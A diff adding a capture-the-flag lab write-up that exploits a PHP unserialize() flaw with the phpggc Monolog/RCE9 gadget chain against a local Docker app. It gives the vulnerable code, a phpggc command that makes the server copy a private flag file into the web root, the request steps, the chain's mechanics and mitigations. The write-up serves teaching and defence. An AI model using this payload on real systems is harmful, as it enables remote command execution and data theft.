@@ -1,0 +1,49 @@
+Monolog/RCE9 - Concise Laboratory Write-up
+===========================================
+
+Environment
+-----------
+The host system is running on Docker Desktop with Linux based containers. The victim exposes exposes the application at http://localhost:8400. The attacker steps are executed on a Linux OS.
+
+Vulnerability
+-------------
+The endpoint /php/aggiungi_quadro.php passes the user-controlled painting_entry POST parameter directly to unserialize():
+
+    $result = unserialize($_POST["painting_entry"]);
+
+Because the application autoloads Monolog classes, an attacker can submit a crafted object instead of the serialized painting array expected by the application.
+
+Reproduction
+------------
+1. Start the victim from the phpggc directory:
+
+    docker compose up -d --build 
+
+    docker exec -it phpggc_lab bash
+
+2. On the attacker-side.
+	
+    git clone https://github.com/ambionics/phpggc.git /opt/phpggc \
+    && chmod +x /opt/phpggc/phpggc
+
+    /opt/phpggc/phpggc -u Monolog/RCE9 system "cp /var/www/html/private/flag.txt /var/www/html/RCE9_CTF.txt"
+
+3. Intercept a legitimate painting submission with Burp Suite Repeater. Replace the value of painting_entry with the generated payload and send the request to:
+
+    POST http://localhost:8400/php/aggiungi_quadro.php
+
+4. Verify the side effect by opening:
+
+    http://localhost:8400/RCE9_CTF.txt
+
+The copied file contains the laboratory flag:
+
+    SNH{M0no1lG_cH411enG3}
+
+Why it works
+------------
+unserialize() reconstructs a crafted Monolog\Handler\FingersCrossedHandler. The application rejects it because it is not an array and terminates the request. During PHP shutdown, the inherited destructor calls close(), which flushes the attacker's buffered LogRecord. A self-reference redirects processing back to the crafted handler, whose processors are get_object_vars, end, and system. They convert the record into an array, select the embedded shell command, and execute it with system().
+
+Mitigation
+----------
+Do not pass untrusted data to unserialize(). Use JSON with explicit structure and type validation. If native deserialization cannot be removed immediately, consider teh use of a allowed_classes combined with unserialize().
